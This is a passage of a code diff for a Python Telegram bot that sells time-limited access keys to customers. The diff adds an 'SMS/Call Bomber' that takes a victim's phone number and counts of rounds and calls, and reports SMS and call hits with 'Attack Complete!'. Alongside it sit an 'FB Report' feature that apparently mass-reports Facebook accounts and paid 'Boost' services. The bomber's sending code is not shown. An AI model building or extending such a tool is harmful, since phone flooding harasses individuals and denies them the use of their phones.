+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"▸ CALL OK   : {voice_success}/{voice_total} ({voice_success*100//voice_total if voice_total > 0 else 0}%)\n"
+        f"▸ CALL FAIL : {voice_total - voice_success}/{voice_total}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"▸ TOTAL     : {sms_success + voice_success}/{sms_total + voice_total}\n\n"
+        f"▸ Attack Complete!"
+    )
+    
+    await query.edit_message_text(report)
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("× Admin only.")
         return
-
     context.user_data.clear()
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║      ADMIN PANEL           ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Select an option below :",
-        reply_markup=admin_keyboard()
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║      ADMIN PANEL           ║\n╚════════════════════════════╝\n\n▸ Select an option below :", reply_markup=admin_keyboard())
 
 async def generate_key_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("× Admin only.")
         return
-
     context.user_data.clear()
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║   GENERATE ACCESS KEY      ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Choose key type :",
-        reply_markup=key_type_keyboard()
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║   GENERATE ACCESS KEY      ║\n╚════════════════════════════╝\n\n▸ Choose key type :", reply_markup=key_type_keyboard())
 
 async def handle_key_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-
     data = query.data
-
     try:
         if data == "cancel":
             context.user_data.clear()
             await query.edit_message_text("× Operation cancelled.")
             return
-
         if data.startswith("keytype:"):
             key_type = data.split(":")[1]
-
             if key_type == "lifetime":
                 key = create_access_key(is_lifetime=True, created_by=query.from_user.id)
-                await query.edit_message_text(
-                    "╔════════════════════════════╗\n"
-                    "║    KEY CREATED SUCCESS     ║\n"
-                    "╚════════════════════════════╝\n\n"
-                    f"▸ Key      : {key.key}\n"
-                    f"▸ Duration : LIFETIME\n"
-                    f"▸ Status   : Available\n\n"
-                    "Send this key to your customer."
-                )
+                await query.edit_message_text(f"╔════════════════════════════╗\n║    KEY CREATED SUCCESS     ║\n╚════════════════════════════╝\n\n▸ Key      : {key.key}\n▸ Duration : LIFETIME\n▸ Status   : Available\n\nSend this key to your customer.")
                 context.user_data.clear()
                 return
-
             elif key_type == "custom":
                 context.user_data['awaiting'] = 'key_duration'
-                await query.edit_message_text(
-                    "╔════════════════════════════╗\n"
-                    "║    CUSTOM KEY DURATION     ║\n"
-                    "╚════════════════════════════╝\n\n"
-                    "▸ Enter duration in format :\n"
-                    "▸ days,hours\n\n"
-                    "Examples :\n"
-                    "  ◈ 3,0   = 3 days\n"
-                    "  ◈ 0,12  = 12 hours\n"
-                    "  ◈ 7,12  = 7 days 12 hours\n\n"
-                    "Type /cancel to cancel."
-                )
+                await query.edit_message_text("╔════════════════════════════╗\n║    CUSTOM KEY DURATION     ║\n╚════════════════════════════╝\n\n▸ Enter duration in format :\n▸ days,hours\n\nExamples :\n  ◈ 3,0   = 3 days\n  ◈ 0,12  = 12 hours\n  ◈ 7,12  = 7 days 12 hours\n\nType /cancel to cancel.")
                 return
-
     except Exception as e:
         logger.error(f"KEYGEN ERROR: {type(e).__name__}: {e}")
 
 async def handle_key_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     context.user_data.pop('awaiting', None)
-
     try:
         days_str, hours_str = text.split(',')
         days = int(days_str.strip())
         hours = int(hours_str.strip())
-
-        if days < 0 or hours < 0:
-            raise ValueError("Negative values not allowed")
-        if days == 0 and hours == 0:
-            raise ValueError("Duration cannot be zero")
-        if days > 365:
-            raise ValueError("Days cannot exceed 365")
-        if hours > 23:
-            raise ValueError("Hours cannot exceed 23")
-
+        if days < 0 or hours < 0: raise ValueError("Negative values not allowed")
+        if days == 0 and hours == 0: raise ValueError("Duration cannot be zero")
+        if days > 365: raise ValueError("Days cannot exceed 365")
+        if hours > 23: raise ValueError("Hours cannot exceed 23")
     except ValueError as e:
-        await update.message.reply_text(
-            f"× Invalid input : {e}\n\n"
-            f"▸ Use format : days,hours\n"
-            f"▸ Example : 3,0 for 3 days\n\n"
-            "Type /cancel to cancel."
-        )
+        await update.message.reply_text(f"× Invalid input : {e}\n\n▸ Use format : days,hours\n▸ Example : 3,0 for 3 days\n\nType /cancel to cancel.")
         context.user_data['awaiting'] = 'key_duration'
         return
-
-    key = create_access_key(
-        duration_days=days,
-        duration_hours=hours,
-        created_by=update.effective_user.id
-    )
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║    KEY CREATED SUCCESS     ║\n"
-        "╚════════════════════════════╝\n\n"
-        f"▸ Key      : {key.key}\n"
-        f"▸ Duration : {days}D {hours}H\n"
-        f"▸ Status   : Available\n\n"
-        "Send this key to your customer."
-    )
+    key = create_access_key(duration_days=days, duration_hours=hours, created_by=update.effective_user.id)
+    await update.message.reply_text(f"╔════════════════════════════╗\n║    KEY CREATED SUCCESS     ║\n╚════════════════════════════╝\n\n▸ Key      : {key.key}\n▸ Duration : {days}D {hours}H\n▸ Status   : Available\n\nSend this key to your customer.")
 
 async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-
+    if not is_admin(update.effective_user.id): return
     if not KEYS:
         await update.message.reply_text("× No keys generated yet.")
         return
-
     keys_list = sorted(KEYS.values(), key=lambda x: x.created_at, reverse=True)[:20]
-
-    message = (
-        "╔════════════════════════════╗\n"
-        "║      RECENT KEYS           ║\n"
-        "╚════════════════════════════╝\n\n"
-    )
-
+    message = "╔════════════════════════════╗\n║      RECENT KEYS           ║\n╚════════════════════════════╝\n\n"
     for key in keys_list:
-        if key.revoked:
-            status = "REVOKED"
+        if key.revoked: status = "REVOKED"
         elif key.used_by:
             user = USERS.get(key.used_by)
-            username = user.username if user else "Unknown"
-            status = f"USED BY {username}"
-        elif time.time() > key.expires_at:
-            status = "EXPIRED"
-        else:
-            status = "AVAILABLE"
-
+            status = f"USED BY {user.username if user else 'Unknown'}"
+        elif time.time() > key.expires_at: status = "EXPIRED"
+        else: status = "AVAILABLE"
         duration = "LIFETIME" if key.is_lifetime else f"{key.duration_days}D {key.duration_hours}H"
-
-        message += (
-            f"▸ Key      : {key.key}\n"
-            f"▸ Duration : {duration}\n"
-            f"▸ Status   : {status}\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-        )
-
+        message += f"▸ Key      : {key.key}\n▸ Duration : {duration}\n▸ Status   : {status}\n━━━━━━━━━━━━━━━━━━━━\n"
     await update.message.reply_text(message)
 
 async def global_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-
+    if not is_admin(update.effective_user.id): return
     total_users = len(USERS)
     active_users = sum(1 for u in USERS.values() if has_access(u.user_id))
     total_keys = len(KEYS)
     used_keys = sum(1 for k in KEYS.values() if k.used_by)
-
     stats_text = (
-        "╔════════════════════════════╗\n"
-        "║     GLOBAL STATISTICS      ║\n"
-        "╚════════════════════════════╝\n\n"
-        f"▸ Total Users   : {total_users}\n"
-        f"▸ Active Users  : {active_users}\n"
-        f"▸ Total Keys    : {total_keys}\n"
-        f"▸ Used Keys     : {used_keys}\n"
-        f"▸ Total Clicks  : {SETTINGS.total_clicks}\n"
-        f"▸ Maintenance   : {'ON' if SETTINGS.maintenance_mode else 'OFF'}"
+        "╔════════════════════════════╗\n║     GLOBAL STATISTICS      ║\n╚════════════════════════════╝\n\n"
+        f"▸ Total Users   : {total_users}\n▸ Active Users  : {active_users}\n▸ Total Keys    : {total_keys}\n"
+        f"▸ Used Keys     : {used_keys}\n▸ Total Clicks  : {SETTINGS.total_clicks}\n▸ Maintenance   : {'ON' if SETTINGS.maintenance_mode else 'OFF'}"
     )
-
     await update.message.reply_text(stats_text)
 
 async def revoke_key_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-
+    if not is_admin(update.effective_user.id): return
     context.user_data.clear()
     context.user_data['awaiting'] = 'revoke_key'
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║      REVOKE KEY            ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Enter the key to revoke :\n"
-        "▸ Format : CLOUT-XXXXXXXXXXXX\n\n"
-        "Type /cancel to cancel."
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║      REVOKE KEY            ║\n╚════════════════════════════╝\n\n▸ Enter the key to revoke :\n▸ Format : CLOUT-XXXXXXXXXXXX\n\nType /cancel to cancel.")
 
 async def handle_revoke_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key_string = update.message.text.strip().upper()
     context.user_data.pop('awaiting', None)
-
     result = revoke_key(key_string)
     await update.message.reply_text(result['message'])
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-
+    if not is_admin(update.effective_user.id): return
     context.user_data.clear()
     context.user_data['awaiting'] = 'broadcast'
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║     BROADCAST MESSAGE      ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Send the message to broadcast :\n"
-        "Type /cancel to cancel."
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║     BROADCAST MESSAGE      ║\n╚════════════════════════════╝\n\n▸ Send the message to broadcast :\nType /cancel to cancel.")
 
 async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message.text
     context.user_data.pop('awaiting', None)
-
     success = 0
     failed = 0
-
-    status_msg = await update.message.reply_text(
-        f"▸ Sending broadcast to {len(USERS)} users..."
-    )
-
+    status_msg = await update.message.reply_text(f"▸ Sending broadcast to {len(USERS)} users...")
     for user_id in USERS:
         try:
             await context.bot.send_message(chat_id=user_id, text=message)
@@ -1113,39 +1176,36 @@ async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(0.05)
         except:
             failed += 1
-
-    await status_msg.edit_text(
-        "╔════════════════════════════╗\n"
-        "║    BROADCAST COMPLETE      ║\n"
-        "╚════════════════════════════╝\n\n"
-        f"▸ Success : {success}\n"
-        f"▸ Failed  : {failed}"
-    )
+    await status_msg.edit_text(f"╔════════════════════════════╗\n║    BROADCAST COMPLETE      ║\n╚════════════════════════════╝\n\n▸ Success : {success}\n▸ Failed  : {failed}")
 
 async def toggle_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-
+    if not is_admin(update.effective_user.id): return
     SETTINGS.maintenance_mode = not SETTINGS.maintenance_mode
     save_settings()
-
     status = "ON" if SETTINGS.maintenance_mode else "OFF"
     await update.message.reply_text(f"▸ Maintenance mode : {status}")
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text(
-        "× Operation cancelled.",
-        reply_markup=main_keyboard(update.effective_user.id)
-    )
+    await update.message.reply_text("× Operation cancelled.", reply_markup=main_keyboard(update.effective_user.id))
 
 async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
-
     user = update.effective_user
     get_or_create_user(user.id, user.username or "", user.first_name or "")
 
     awaiting = context.user_data.get('awaiting')
+    bomber_awaiting = context.user_data.get('bomber_awaiting')
+
+    if bomber_awaiting == 'phone':
+        await handle_bomber_phone(update, context)
+        return
+    if bomber_awaiting == 'rounds':
+        await handle_bomber_rounds(update, context)
+        return
+    if bomber_awaiting == 'calls':
+        await handle_bomber_calls(update, context)
+        return
 
     if awaiting == 'fb_id':
         await handle_fb_id(update, context)
@@ -1156,32 +1216,23 @@ async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if awaiting == 'fb_count':
         await handle_fb_count(update, context)
         return
-
     if awaiting == 'key':
         await handle_key_input(update, context)
         return
-
     if awaiting == 'key_duration':
         await handle_key_duration(update, context)
         return
-
     if awaiting == 'broadcast':
         await handle_broadcast(update, context)
         return
-
     if awaiting == 'revoke_key':
         await handle_revoke_key(update, context)
         return
 
     if "tiktok.com" in text.lower():
         if not has_access(user.id) and not is_admin(user.id):
-            await update.message.reply_text(
-                "× You need access to use the TikTok Downloader.\n\n"
-                "▸ Use '▸ Get Access' to redeem a key.",
-                reply_markup=main_keyboard(user.id)
-            )
+            await update.message.reply_text("× You need access to use the TikTok Downloader.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
             return
-        
         urls = [word for word in text.split() if "tiktok.com" in word.lower()]
         if urls:
             await download_tiktok_video(update, context, urls[0])
@@ -1190,13 +1241,11 @@ async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if text == "▸ Boost Services":
         await boost_services(update, context)
     elif text == "▸ TikTok Downloader":
-        await update.message.reply_text(
-            "▸ Send me any TikTok video link and I will download it for you!\n\n"
-            "Example:\n"
-            "https://vt.tiktok.com/ZSpYgeCoc/"
-        )
+        await update.message.reply_text("▸ Send me any TikTok video link and I will download it for you!\n\nExample:\nhttps://vt.tiktok.com/ZSpYgeCoc/")
     elif text == "▸ FB Report":
         await fb_report_menu(update, context)
+    elif text == "▸ SMS/Call Bomber":
+        await sms_bomber_menu(update, context)
     elif text == "▸ Get Access":
         await get_access(update, context)
     elif text == "▸ Redeem Key":
@@ -1222,21 +1271,14 @@ async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif text == "▸ Main Menu":
         await start(update, context)
     else:
-        await update.message.reply_text(
-            "× Invalid option.\n"
-            "▸ Please use the menu buttons below.",
-            reply_markup=main_keyboard(user.id)
-        )
+        await update.message.reply_text("× Invalid option.\n▸ Please use the menu buttons below.", reply_markup=main_keyboard(user.id))
 
 def main():
     if not BOT_TOKEN:
         logger.error("BOT_TOKEN not set!")
         return
-
     load_state()
-
     application = Application.builder().token(BOT_TOKEN).build()
-
     application.add_error_handler(error_handler)
 
     application.add_handler(CallbackQueryHandler(handle_key_generation, pattern="^keytype:"))
@@ -1244,6 +1286,7 @@ def main():
     application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^category:"))
     application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^back_to_categories$"))
     application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^main_menu$"))
+    application.add_handler(CallbackQueryHandler(handle_bomber_deploy, pattern="^bomber:"))
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("stats", my_stats))
@@ -1254,8 +1297,7 @@ def main():
 
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))
 
-    logger.info("Clout Premium Bot started!")
-    
+    logger.info("Rudo Tools Bot with SMS/Call Bomber started!")
     application.run_polling(stop_signals=None)
 
 if __name__ == "__main__":
